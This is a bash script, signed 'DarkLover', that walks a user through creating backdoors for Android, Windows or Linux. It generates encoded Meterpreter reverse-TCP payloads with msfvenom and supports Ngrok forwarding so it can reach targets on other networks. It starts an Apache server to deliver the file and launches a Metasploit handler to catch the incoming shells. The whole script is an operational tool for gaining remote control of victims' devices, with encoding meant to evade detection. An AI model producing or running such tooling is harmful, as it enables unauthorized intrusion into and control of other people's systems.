#!/bin/bash
# This Script Was Created By DarkLover
echo ""
echo "\e[96m 	 ____             _     _                         	"
echo "\e[96m 	|  _ \  __ _ _ __| | _ | |    _____   _____  _ __ 	"
echo "\e[96m 	| | | |/ _  |  __| |/ /| |   / _ \ \ / / _ \| ___|	"
echo "\e[96m 	| |_| | (_| | |  |   < | |__| (_) \ V /  __/| |   	"
echo "\e[96m 	|____/ \__ _|_|  |_|\_\|_____\___/ \_/ \___||_|   	"
#echo "\e[96m           This Script Was Created By DarkLover         	"
echo ""
echo ""
echo "\e[91m[*] \e[96mWhich Device You Want To Create Back door..\e[5m_\e[0m\n"
echo "\t\e[91m[1] \e[96mFor Android\e[0m\n"
echo "\t\e[91m[2] \e[96mFor Windows x86 Based Systems\e[0m\n"
echo "\t\e[91m[3] \e[96mFor Windows x64 Based Systems\e[0m\n"
echo "\t\e[91m[4] \e[96mFor Linux x86 Based Systems\e[0m\n"
echo "\t\e[91m[5] \e[96mFor Linux x64 Based Systems\e[0m\n"
echo "\t\e[91m[6] \e[96mFor Manual Entry Of Auxiliary\e[0m\n"
echo "\e[91m[*] \e[96mSelect a Number:\e[5m_\e[0m"
while true ; do
read CAS
if [ $CAS -eq 1 ]
then
AUX=android/meterpreter/reverse_tcp
ARCH=dalvik
PLAT=android
ENCO=x86/shikata_ga_nai
break;
elif [ $CAS -eq 2 ]
then
AUX=windows/meterpreter/reverse_tcp
ARCH=x86
PLAT=windows
ENCO=x86/shikata_ga_nai
break;
elif [ $CAS -eq 3 ]
then
AUX=windows/x64/meterpreter/reverse_tcp
ARCH=x64
PLAT=windows
ENCO=cmd/powershell_base64
break;
elif [ $CAS -eq 4 ]
then
AUX=linux/x86/meterpreter/reverse_tcp
ARCH=x86
PLAT=linux
ENCO=x86/xor_dynamic
break;
elif [ $CAS -eq 5 ]
then
AUX=linux/x64/meterpreter/reverse_tcp
ARCH=x64
PLAT=linux
ENCO=x64/xor_dynamic
break;
elif [ $CAS -eq 6 ]
then
echo "\n\e[91m[*] \e[96mEnter The Auxiliary:\e[0m"
read AUX
echo "\n\e[91m[*] \e[96mEnter The Architecture:\e[0m"
read ARCH
echo "\n\e[91m[*] \e[96mEnter The Platform:\e[0m"
read PLAT
echo "\n\e[91m[*] \e[96mEnter The Encoder:\e[0m"
read ENCO
break;
else
echo "\n\e[91m[*] \e[96mGiven Number is Not Valid\e[0m"
echo "\n\e[91m[*] \e[96mRe-Enter Any Number Between [1-6]..\e[0m"
fi
done
echo "\n\e[91m[1] \e[96mAutomatic Local Host And Local Port Selection (For LAN Attacks)\e[0m"
echo "\n\e[91m[2] \e[96mManual Local Host And local Port Selection (For WLAN Attacks Using Ngrok Port Forwarding Tool)\e[0m"
echo "\n\e[91m[*] \e[96mSelect an Option:\e[5m_\e[0m"
while true; do
read Address 
if [ $Address -eq 1 ]
then
echo "\n\e[91m[*] \e[96mAutomatically Local Host($LHO) Selected..!\e[0m"
LHO=$(ifconfig eth0 | grep "inet " | cut -d: -f2 | awk '{ print $2}')
echo "\n\e[91m[*] \e[96mEnter Local Port:\e[5m_\e[0m"
read LPO
break;
elif [ $Address -eq 2 ]
then
echo "\n\e[91m[*] \e[96mIf You Want to Use Manual Host You Need Port forwading Tool Like Ngrok to Connect Between Two Networks\e[0m" 
echo "\n\e[91m[*] \e[96mWithout Port Forwarding Tool Manual Method Won't Work..!\e[0m"
echo "\n\e[91m[*] \e[96mEnter Ngrok's Address Here:\e[5m_\e[0m"
read LHO
echo "\n\e[91m[*] \e[96mEnter Ngrok's Local Port Here:\e[5m_\e[0m"
read LPO
break;
else
echo "\n\e[91m[*] \e[96mGiven Number is Not Valid\e[0m"
echo "\n\e[91m[*] \e[96mRe-Enter The Number..\e[0m"
fi
done
echo "\n\e[91m[*] \e[96mEnter File_Name.File_Format:\e[5m_\e[0m"
read FIL
CUD=$(pwd)
echo "\n\t\e[91m[0] \e[96mPress 0 To Enter Your Option \e[0m" 
echo "\n\t\e[91m[1] \e[96mPress 1 For Default Option : /root/Desktop/ \e[0m" 
echo "\n\t\e[91m[2] \e[96mPress 2 For Current Directory : $CUD/\e[0m"
echo "\n\t\e[91m[*] \e[96mSelect Option:\e[5m_\e[0m"
while true; do
read OPT
if [ $OPT -eq 0 ]
then
echo "\n\e[91m[*] \e[96mEnter Where to Save:\e[5m_\e[0m"
read sav
break;
elif [ $OPT -eq 1 ]
then
sav=/root/Desktop/
break;
elif [ $OPT -eq 2 ]
then
sav=$CUD/
break;
else
echo "\n\e[91m[*] \e[96mGiven Option is Not Valid \e[0m"
echo "\n\e[91m[*] \e[96mRe-Enter The Option \e[0m"
fi
done
echo "\n\n\t\e[91m[*] \e[96mAuxilary:\t\e[5m\e[93m$AUX\e[0m" 
echo "\n\t\e[91m[*] \e[96mLocal Host:\t\e[5m\e[93m$LHO\e[0m" 
echo "\n\t\e[91m[*] \e[96mLocal Port:\t\e[5m\e[93m$LPO\e[0m"
echo "\n\t\e[91m[*] \e[96mFile_Name:\t\e[5m\e[93m$FIL\e[0m" 
echo "\n\t\e[91m[*] \e[96mSaved:\t\e[5m\e[93m$sav\e[0m"
echo "\n\n\e[91m[*] \e[96mStarting to Create Payload:\e[0m"
echo "\n\e[91m[*] \e[96mCreating Payload:\e[5m_\e[0m"
msfvenom -a $ARCH --platform $PLAT -p $AUX LHOST=$LHO LPORT=$LPO -e $ENCO -i 10 -f raw >$sav$FIL
echo "\n\e[91m[*] \e[96mShall I Start Apache Server & Postgresql :1/0(Yes/No)\e[5m_\e[0m"
while true; do
read Y
if [ $Y -eq 1 ]
then
{
echo "\n\e[91m[*] \e[96mStarting Apache2 Web Server:\e[5m_\e[0m"
service apache2 start
echo "\n\e[91m[*] \e[96mStarting Postgresql Database:\e[5m_\e[0m"
service postgresql start
break;
}
elif [ $Y -eq 0 ]
then
{
echo "\n\e[91m[*] \e[96mYou Declined ..![X]\e[5m_\e[0m"
break;
}
else
echo "\n\e[91m[*] \e[96mGiven Option is Not Valid ..!\e[0m"
echo "\n\e[91m[*] \e[96mRe-Enter The Option\e[0m"
fi
done
echo "\n\e[91m[*] \e[96mAutomatically Selected $AUX for Listener Creator From Above Selections..\e[0m\n"
echo "\e[91m[*] \e[96mAutomatically Selected $LHO for Listener Creator From Above Selections..\e[0m\n"
echo "\e[91m[*] \e[96mAutomatically Selected $LPO for Listener Creator From Above Selections..\e[0m\n"
echo "\n\n\t\e[91m[*] \e[96mAuxilary:\t\e[5m\e[93m$AUX\e[0m" 
echo "\n\t\e[91m[*] \e[96mLocal Host:\t\e[5m\e[93m$LHO\e[0m" 
echo "\n\t\e[91m[*] \e[96mLocal Port:\t\e[5m\e[93m$LPO\e[0m"
echo "\n\e[91m[*] \e[96mStarting To Create Listener\e[5m_\e[0m"
sudo service postgresql start && sudo msfdb init && sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $AUX; set LHOST $LHO; set LPORT $LPO; exploit"
#This Script Was Created By DarkLover